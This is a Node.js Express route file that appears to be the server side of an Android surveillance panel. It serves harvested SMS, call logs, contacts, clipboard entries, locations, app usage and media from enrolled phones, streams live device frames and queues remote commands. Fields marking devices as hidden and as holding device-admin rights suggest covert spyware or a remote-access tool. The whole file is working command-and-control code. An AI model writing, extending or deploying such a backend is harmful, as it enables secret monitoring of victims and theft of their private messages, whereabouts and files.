'use strict';

const express = require('express');
const fs = require('fs');
const bcrypt = require('bcryptjs');
const { query } = require('../db');
const { signUserToken } = require('../auth');
const { jwtAuth, clientIp, audit } = require('../middleware');
const { SMS_INTERVAL, MIN_SMS_INTERVAL, MAX_SMS_INTERVAL } = require('../config');
const ws = require('../ws');
const mediaRouter = require('./media');

const router = express.Router();
const ONLINE_WINDOW_S = parseInt(process.env.ONLINE_WINDOW_S || '30', 10);

function parseIntOr(v, def) {
  const n = parseInt(v, 10);
  return Number.isFinite(n) ? n : def;
}

// ---------------------------------------------------------------------------
// auth
// ---------------------------------------------------------------------------
router.post('/auth/login', async (req, res, next) => {
  try {
    const { email, password } = req.body || {};
    if (!email || !password) {
      return res.status(401).json({ error: 'invalid credentials' });
    }
    const rows = await query('SELECT id, email, role, password_hash FROM users WHERE email=? LIMIT 1', [
      String(email),
    ]);
    if (!rows.length) {
      return res.status(401).json({ error: 'invalid credentials' });
    }
    const user = rows[0];
    const ok = await bcrypt.compare(String(password), user.password_hash);
    if (!ok) {
      return res.status(401).json({ error: 'invalid credentials' });
    }
    const token = signUserToken(user);
    await audit(user.id, null, 'login', null, clientIp(req));
    res.json({ token, user: { id: user.id, email: user.email, role: user.role } });
  } catch (err) {
    next(err);
  }
});

router.get('/auth/me', jwtAuth, (req, res) => {
  res.json({ user: { id: req.user.id, email: req.user.email, role: req.user.role } });
});

// ---------------------------------------------------------------------------
// devices
// ---------------------------------------------------------------------------
router.get('/devices', jwtAuth, async (req, res, next) => {
  try {
    const devices = await ws.buildDevices(null);
    res.json({ devices });
  } catch (err) {
    next(err);
  }
});

async function deviceDetail(id) {
  const rows = await query(
    `SELECT d.*,
            (d.last_seen IS NOT NULL AND d.last_seen >= (NOW() - INTERVAL ? SECOND)) AS is_online
       FROM devices d WHERE d.id=? LIMIT 1`,
    [ONLINE_WINDOW_S, id]
  );
  if (!rows.length) return null;
  const d = rows[0];
  const perms = await query(
    'SELECT permission, granted FROM device_permissions WHERE device_id=? ORDER BY permission ASC',
    [id]
  );
  const counts = {};
  for (const [key, table] of [
    ['sms_count', 'sms_messages'],
    ['call_count', 'call_logs'],
    ['contact_count', 'contacts'],
    ['clipboard_count', 'clipboard_entries'],
    ['app_count', 'installed_apps'],
    ['location_count', 'locations'],
    ['usage_count', 'usage_events'],
    ['media_count', 'media_files'],
  ]) {
    const r = await query(`SELECT COUNT(*) AS c FROM ${table} WHERE device_id=?`, [id]);
    counts[key] = Number(r[0].c);
  }
  const frame = mediaRouter.liveFrames.get(d.device_uid);
  return {
    id: d.id,
    user_id: d.user_id,
    device_uid: d.device_uid,
    label: d.label,
    model: d.model,
    manufacturer: d.manufacturer,
    android_release: d.android_release,
    sdk_int: d.sdk_int,
    app_version: d.app_version,
    is_online: !!d.is_online,
    hidden: !!d.hidden,
    admin_active: !!d.admin_active,
    battery: d.battery,
    ip_address: d.ip_address,
    last_seen: d.last_seen,
    created_at: d.created_at,
    // null = no per-device override, the client uses the global SMS_INTERVAL_S
    sms_interval_s: d.sms_interval_s === undefined ? null : d.sms_interval_s,
    frame_available: !!frame,
    permissions: perms.map((p) => ({ name: p.permission, granted: !!p.granted })),
    ...counts,
  };
}

router.get('/devices/:id', jwtAuth, async (req, res, next) => {
  try {
    const detail = await deviceDetail(parseIntOr(req.params.id, 0));
    if (!detail) return res.status(404).json({ error: 'device not found' });
    res.json(detail);
  } catch (err) {
    next(err);
  }
});

router.delete('/devices/:id', jwtAuth, async (req, res, next) => {
  try {
    const id = parseIntOr(req.params.id, 0);
    const r = await query('DELETE FROM devices WHERE id=?', [id]);
    if (!r.affectedRows) return res.status(404).json({ error: 'device not found' });
    await audit(req.user.id, id, 'device_delete', null, clientIp(req));
    res.json({ status: 'ok' });
  } catch (err) {
    next(err);
  }
});

// ---------------------------------------------------------------------------
// commands
// ---------------------------------------------------------------------------
router.get('/devices/:id/commands', jwtAuth, async (req, res, next) => {
  try {
    const id = parseIntOr(req.params.id, 0);
    const limit = parseIntOr(req.query.limit, 50);
    const rows = await query(
      `SELECT id, action, params, status, result_message, created_at, delivered_at, completed_at, ttl_seconds
         FROM commands WHERE device_id=? ORDER BY id DESC LIMIT ?`,
      [id, limit]
    );
    const commands = rows.map((r) => {
      let params = r.params;
      if (typeof params === 'string') {
        try {
          params = JSON.parse(params);
        } catch (e) {
          params = {};
        }
      }
      return { ...r, params: params || {} };
    });
    res.json({ commands });
  } catch (err) {
    next(err);
  }
});

router.post('/devices/:id/commands', jwtAuth, async (req, res, next) => {
  try {
    const id = parseIntOr(req.params.id, 0);
    const { action, params, ttl_seconds } = req.body || {};
    if (!action) return res.status(400).json({ error: 'action required' });
    const dev = await query('SELECT id FROM devices WHERE id=? LIMIT 1', [id]);
    if (!dev.length) return res.status(404).json({ error: 'device not found' });
    const ttl = parseIntOr(ttl_seconds, 120);
    const r = await query(
      `INSERT INTO commands (device_id, user_id, action, params, ttl_seconds) VALUES (?,?,?,?,?)`,
      [id, req.user.id, String(action), JSON.stringify(params || {}), ttl]
    );

    // set_sms_interval moves the device's own SMS cadence, so persist it as a
    // per-device setting: /commands re-sends config.sms_interval_s on every poll,
    // which would otherwise overwrite the client's local value within seconds.
    let smsInterval = null;
    if (String(action) === 'set_sms_interval') {
      const requested = parseIntOr((params || {}).seconds, SMS_INTERVAL);
      smsInterval = Math.min(MAX_SMS_INTERVAL, Math.max(MIN_SMS_INTERVAL, requested));
      await query('UPDATE devices SET sms_interval_s=? WHERE id=?', [smsInterval, id]);
    }

    const command = { id: r.insertId, action: String(action), params: params || {}, status: 'pending' };
    await audit(req.user.id, id, 'command_create', action, clientIp(req));
    ws.broadcast({ type: 'command_created', device_id: id, command });
    res.json({ id: r.insertId, status: 'pending', sms_interval_s: smsInterval });
  } catch (err) {
    next(err);
  }
});

// ---------------------------------------------------------------------------
// device data
// ---------------------------------------------------------------------------
const DATA_KINDS = {
  sms: { table: 'sms_messages', order: 'id DESC' },
  call_logs: { table: 'call_logs', order: 'id DESC' },
  contacts: { table: 'contacts', order: 'id DESC' },
  clipboard: { table: 'clipboard_entries', order: 'id DESC' },
  installed_apps: { table: 'installed_apps', order: 'id DESC' },
  locations: { table: 'locations', order: 'id DESC' },
  usage_events: { table: 'usage_events', order: 'id DESC' },
  media: { table: 'media_files', order: 'id DESC' },
};

router.get('/devices/:id/data/:kind', jwtAuth, async (req, res, next) => {
  try {
    const kind = req.params.kind;
    const spec = DATA_KINDS[kind];
    if (!spec) return res.status(400).json({ error: 'unknown kind' });
    const id = parseIntOr(req.params.id, 0);
    const limit = Math.min(parseIntOr(req.query.limit, 100), 500);
    const offset = parseIntOr(req.query.offset, 0);
    const items = await query(
      `SELECT * FROM ${spec.table} WHERE device_id=? ORDER BY ${spec.order} LIMIT ? OFFSET ?`,
      [id, limit, offset]
    );
    res.json({ items, kind });
  } catch (err) {
    next(err);
  }
});

// ---------------------------------------------------------------------------
// media: live frame + stored file
// ---------------------------------------------------------------------------
router.get('/media/frame/:deviceId', jwtAuth, async (req, res, next) => {
  try {
    const id = parseIntOr(req.params.deviceId, 0);
    const rows = await query('SELECT device_uid FROM devices WHERE id=? LIMIT 1', [id]);
    if (!rows.length) return res.status(404).json({ error: 'device not found' });
    const frame = mediaRouter.liveFrames.get(rows[0].device_uid);
    if (!frame) return res.status(404).json({ error: 'no frame' });
    res.set('Content-Type', frame.mime || 'image/jpeg');
    res.set('Cache-Control', 'no-store');
    res.send(frame.buffer);
  } catch (err) {
    next(err);
  }
});

router.get('/media/file/:mediaFileId', jwtAuth, async (req, res, next) => {
  try {
    const id = parseIntOr(req.params.mediaFileId, 0);
    const rows = await query('SELECT * FROM media_files WHERE id=? LIMIT 1', [id]);
    if (!rows.length) return res.status(404).json({ error: 'media not found' });
    const m = rows[0];
    if (!m.storage_path || !fs.existsSync(m.storage_path)) {
      return res.status(404).json({ error: 'file missing' });
    }
    res.set('Content-Type', m.mime || 'application/octet-stream');
    fs.createReadStream(m.storage_path).pipe(res);
  } catch (err) {
    next(err);
  }
});

// ---------------------------------------------------------------------------
// rules
// ---------------------------------------------------------------------------
router.get('/rules', jwtAuth, async (req, res, next) => {
  try {
    const items = await query(
      'SELECT id, package, created_at FROM app_rules WHERE user_id=? ORDER BY package ASC',
      [req.user.id]
    );
    res.json({ rules: items });
  } catch (err) {
    next(err);
  }
});

router.post('/rules', jwtAuth, async (req, res, next) => {
  try {
    const { package: pkg } = req.body || {};
    if (!pkg) return res.status(400).json({ error: 'package required' });
    await query(
      'INSERT INTO app_rules (user_id, package) VALUES (?,?) ON DUPLICATE KEY UPDATE package=VALUES(package)',
      [req.user.id, String(pkg)]
    );
    const rows = await query('SELECT id, package, created_at FROM app_rules WHERE user_id=? AND package=?', [
      req.user.id,
      String(pkg),
    ]);
    res.json({ rule: rows[0] });
  } catch (err) {
    next(err);
  }
});

router.delete('/rules', jwtAuth, async (req, res, next) => {
  try {
    const pkg = (req.body && req.body.package) || req.query.package;
    if (!pkg) return res.status(400).json({ error: 'package required' });
    const r = await query('DELETE FROM app_rules WHERE user_id=? AND package=?', [req.user.id, String(pkg)]);
    if (!r.affectedRows) return res.status(404).json({ error: 'rule not found' });
    res.json({ status: 'ok' });
  } catch (err) {
    next(err);
  }
});

// ---------------------------------------------------------------------------
// audit
// ---------------------------------------------------------------------------
router.get('/audit', jwtAuth, async (req, res, next) => {
  try {
    const limit = Math.min(parseIntOr(req.query.limit, 100), 500);
    const items = await query(
      `SELECT id, user_id, device_id, action, detail, ip, created_at FROM audit_log ORDER BY id DESC LIMIT ?`,
      [limit]
    );
    res.json({ items });
  } catch (err) {
    next(err);
  }
});

module.exports = router;
module.exports.deviceDetail = deviceDetail;
